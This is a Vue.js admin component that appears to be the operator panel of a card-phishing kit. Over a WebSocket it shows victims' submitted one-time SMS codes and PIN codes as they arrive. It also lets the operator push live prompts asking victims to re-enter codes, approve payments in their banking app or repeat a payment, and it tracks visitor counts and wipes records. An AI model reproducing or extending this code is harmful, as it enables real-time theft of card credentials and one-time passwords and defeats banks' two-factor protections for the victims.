<template>
    <div>
        <page-header :activeCount="activeCount" :lastCount="lastCount" />
        <payment-list :payments="payments"
                      @ask-otp="askOtp"
                      @approve-payment="approvePayment"
                      @repeat-payment="repeatPayment"
                      @delete-selected="deleteSelected"
                      @delete-all="deleteAll" />
    </div>
</template>

<script>

import PaymentList from "./PaymentList";
import PageHeader from "./PageHeader";

export default {
    components: {
        PaymentList,
        PageHeader,
    },
    props: {
        wsServerPath: String
    },
    data() {
        return {
            payments: [],
            wsClient: null,
            lastCount: 0,
            activeCount: 0,
        }
    },
    mounted() {
        axios.get('api/payments')
            .then((response) => {
                this.payments = response.data.payments;
            });

        this.wsClient = new WebSocket(this.wsServerPath);
        const wsClient = this.wsClient;
        const that = this;

        wsClient.onopen = function () {
            var data = { 'type': 'setAdmin' };
            wsClient.send(JSON.stringify(data));
        };

        wsClient.onerror = function (e) {
            console.log("Error occurred.");
        };

        wsClient.onmessage = function (msg) {
            var message = JSON.parse(msg.data);
            switch (message.type) {
                case 'paymentCreated':
                    axios.get('api/payments')
                        .then((response) => {
                            that.payments = response.data.payments;
                        });
                    break;

                case 'otpVerified':
                    var payment = message.payment;
                    that.payments = that.payments.map((p) => p.id === payment.id ?
                        { ...p,
                            'otp_code': payment.otp_code,
                            'pin_code': payment.pin_code,
                            'active': payment.active,
                            'action': payment.action
                        } : p);
                    break;

                case 'updateStatus':
                    var payment = message.payment;
                    that.payments = that.payments.map((p) => p.id === payment.id ?
                        { ...p,
                            'active': payment.active,
                            'action': payment.action,
                            'quit': payment.quit,
                        } : p);
                    break;

                case 'askOTP':
                    var payment = message.data;
                    that.payments = that.payments.map((p) => p.id === payment.id ?
                        { ...p,
                            sms_attempts: payment.sms_attempts,
                            action: payment.action,
                            active: payment.active
                        } : p);
                    break;

                case 'approvalRequired':
                    var payment = message.data;
                    that.payments = that.payments.map((p) => p.id === payment.id ?
                        { ...p,
                            approval_attempts: payment.approval_attempts,
                            action: payment.action,
                            active: payment.active
                        } : p);
                    break;

                case 'repeatPayment':
                    var payment = message.data;
                    that.payments = that.payments.map((p) => p.id === payment.id ?
                        { ...p,
                            repeat_attempts: payment.repeat_attempts,
                            action: payment.action,
                            active: payment.active,
                            quit: 1,
                        } : p);
                    break;

                case 'delete':
                    var ids = message.ids;
                    that.payments = that.payments.filter((payment) => !ids.includes(payment.id));
                    break;

                case 'deleteAll':
                    that.payments = [];
                    break;

                case 'updateActiveCount':
                    var payment = message.payment;
                    // payment is not null, disconnect the user with payment info in the first place.
                    if (payment) {
                        that.payments = that.payments.map((p) => p.id === payment.id ?
                            { ...p,
                                'active': payment.active,
                                'action': payment.action,
                                'quit': payment.quit,
                            } : p);
                    }

                    // Reset the active count of connections
                    var count = message.count;
                    that.activeCount = count;
                    break;

            }
        };
    },
    watch: {
        paymentCount: function (cnt) {
            axios.get('api/getLastVistorsCount')
                .then((response) => {
                    this.lastCount = response.data.count;
                });
        },
        activeCount: function (cnt) {
            axios.get('api/getLastVistorsCount')
                .then((response) => {
                    this.lastCount = response.data.count;
                });
        }
    },
    computed: {
        paymentCount: function () {
            return this.payments.length;
        }
    },
    methods: {
        askOtp(payment) {
            const msg = {
                type: 'askOTP',
                id: payment.id,
                error: payment.sms_attempts > 1 ? this.$trans('mpgs.sms_error') : ''
            };
            this.wsClient.send(JSON.stringify(msg));
        },
        approvePayment(payment) {
            var msg = {
                type: 'approvalRequired',
                id: payment.id,
                error: payment.approval_attempts > 1 ? this.$trans('mpgs.approve_error') : '',
            };
            this.wsClient.send(JSON.stringify(msg));
        },
        repeatPayment(payment, text) {
            var msg = {
                type: 'repeatPayment',
                id: payment.id,
                text: text,
            };
            this.wsClient.send(JSON.stringify(msg));
        },
        deleteSelected() {
            const selectedPayments = this.payments.filter((p) => p.selected == true).map((p) => p.id);
            if (selectedPayments.length === 0)
            {
                this.$alert(this.$trans('mpgs.delete_error'));
                return;
            }
            this.$confirm(this.$trans('mpgs.delete_confirm'))
                .then(() => {
                    const data = {ids: selectedPayments};
                    const that = this;
                    var msg = {
                        type: 'delete',
                        ids: selectedPayments
                    };
                    $.post('/api/delete-payment', data, function () {
                        that.wsClient.send(JSON.stringify(msg));
                    });
                });
        },
        deleteAll() {
            this.$confirm(this.$trans('mpgs.delete_confirm'))
                .then(() => {
                    const that = this;
                    var msg = {
                        type: 'deleteAll',
                    };
                    $.post('/api/delete-all', function () {
                        that.wsClient.send(JSON.stringify(msg));
                    });
                });
        }
    },
    name: "AppComponent"
}
</script>

<style scoped>

</style>
